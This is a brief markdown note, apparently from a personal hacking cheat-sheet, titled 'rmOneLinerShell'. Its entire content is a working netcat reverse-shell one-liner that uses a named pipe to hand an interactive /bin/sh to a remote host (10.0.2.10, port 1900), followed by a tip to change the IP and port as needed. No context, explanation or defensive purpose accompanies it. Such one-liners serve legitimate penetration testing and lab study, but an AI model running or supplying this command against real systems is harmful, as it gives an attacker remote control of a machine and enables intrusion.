---
title: "rmOneLinerShell"
tags:
  - fetus
---
```sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.10 1900 >/tmp/f
```
- modify the ip and port as needed